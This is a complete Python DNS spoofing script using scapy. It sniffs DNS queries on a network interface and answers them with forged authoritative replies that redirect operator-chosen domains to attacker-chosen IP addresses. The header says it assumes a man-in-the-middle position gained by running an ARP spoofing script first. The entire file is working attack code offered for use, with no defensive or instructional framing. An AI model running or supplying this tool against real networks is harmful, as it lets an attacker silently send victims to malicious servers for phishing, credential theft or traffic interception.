# language: Python 3, file: dns_spoof.py, target: Linux (requires scapy + root + MITM position)
# DNS spoofer — intercepts DNS queries and replies with attacker-controlled IPs.
# Must be in MITM position (run arp_spoof.py first).
from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, send
import threading

SPOOF_MAP = {}  # filled at runtime: {b'target.com.': '1.2.3.4'}
lock = threading.Lock()

def dns_handler(pkt):
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
        return
    qname = pkt[DNS].qd.qname
    with lock:
        spoof_ip = SPOOF_MAP.get(qname)
    if not spoof_ip:
        return
    print(f'[*] Spoofing {qname.decode()} -> {spoof_ip}')
    spoofed = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
               UDP(dport=pkt[UDP].sport, sport=53) /
               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                   an=DNSRR(rrname=qname, ttl=10, rdata=spoof_ip)))
    send(spoofed, verbose=False)

def main():
    iface = input('Interface (ex: eth0): ').strip()
    while True:
        domain = input('Domain to spoof (blank to start): ').strip()
        if not domain:
            break
        ip = input(f'  Redirect {domain} to IP: ').strip()
        key = (domain if domain.endswith('.') else domain + '.').encode()
        SPOOF_MAP[key] = ip
    print(f'[*] DNS spoofing {len(SPOOF_MAP)} domain(s) on {iface}')
    print('[*] Ctrl+C to stop')
    sniff(iface=iface, filter='udp port 53', prn=dns_handler, store=False)

if __name__ == '__main__':
    main()
